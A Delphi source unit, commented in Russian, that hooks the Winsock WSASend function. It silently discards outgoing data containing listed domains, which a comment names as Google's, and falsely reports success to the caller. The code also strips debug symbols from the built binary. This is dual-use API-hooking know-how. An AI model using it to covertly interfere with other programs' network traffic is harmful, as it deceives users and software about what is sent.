unit Refining;

interface

uses
  Windows,
  Hook,
  Utils;

{$SETPEFlAGS IMAGE_FILE_DEBUG_STRIPPED or IMAGE_FILE_LINE_NUMS_STRIPPED or IMAGE_FILE_LOCAL_SYMS_STRIPPED}

type


  // Запись для хранения имен доменов к которым обнуляются запросы
  TDomainList = record
    len : byte;
    buf : array of Char;
  end;

  // Запись для функции WSASend
  WSABUF = record
    len: Cardinal;
    buf: PAnsiChar;
  end;
  
  // Запись для функции WSASend
  WSAOVERLAPPED = record
    Internal: DWORD;
    InternalHigh : DWORD;
    Offset : DWORD;
    OffsetHigh : DWORD;
    hEvent : THANDLE;
  end;

  TSocket = Cardinal;

TWSAOverlappedCompletionRoutine = procedure (dwError : DWORD; cbTransferred : DWORD; var lpOverlapped : WSAOVERLAPPED; dwFlags : DWORD);

TWSASend = function(
                    S: TSocket;	var lpBuffers: WSABuf; dwBufferCount: DWORD; var lpNumberOfBytesSent: DWORD; dwFlags: DWORD;
                    var lpOverlapped: WSAOverlapped;	lpCompletionRoutine: TWSAOverlappedCompletionRoutine
                    ): Integer; stdcall;

function WSASend(
                 S: TSocket;	var lpBuffers: WSABuf; dwBufferCount: DWORD; var lpNumberOfBytesSent: DWORD; dwFlags: DWORD;
                 var lpOverlapped: WSAOverlapped;	lpCompletionRoutine: TWSAOverlappedCompletionRoutine
                 ): Integer; stdcall;

VAR
  RAWWSASend : TWSASend;
  REFINELIST : array of TDomainList;  // Массив записей для обнуления запросов к гугле и его доменам
  REFINELISTNUM : integer;        // Число эдементов массива списка обнуления

implementation

// ***********************************************************
// Функции доступа к интернет
// ***********************************************************

function WSASend(
                 S: TSocket;	var lpBuffers: WSABuf; dwBufferCount: DWORD; var lpNumberOfBytesSent: DWORD; dwFlags: DWORD;
                 var lpOverlapped: WSAOverlapped;	lpCompletionRoutine: TWSAOverlappedCompletionRoutine
                 ): Integer; stdcall;

Var
  I: integer;
  Cmp : boolean;
  X, Y: integer;

begin
  Cmp := false;
  lpCompletionRoutine := nil;

  // Цикл сравнения содержимого буффера со списком
  for I := 0 to REFINELISTNUM - 1 do
  begin
    for X := 0 to lpBuffers.len - REFINELIST[I].len do
      begin
      Cmp := TRUE;
      for Y := 0 to REFINELIST[I].len - 1 do
        begin
        Cmp := Cmp and (UpCase(lpBuffers.buf[X+Y]) = UpCase(REFINELIST[I].buf[Y]));
        if Cmp = False then break;
        end;
      if Cmp = True then break;
      end;
  if Cmp = True then break;
  end;
  SetHook(WSACODE, 0);
  // Врианты результата функции
  // 10050 - Сеть не работает, 10051 - Сеть не доступна, 10053 - Соединение прервано, 10054 - Соединение сбрасывается одноранговым узлом
  // 10057 - Сокет не подключен, 10060 - Время ожидания соединения истекло, 10061 - В соединении отказано. 1064 - Хост не работает.
  if Cmp = false then Result := RAWWSASend(S, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped,	lpCompletionRoutine) else Result := 0;
  SetHook(WSACODE, 1);
end;

end.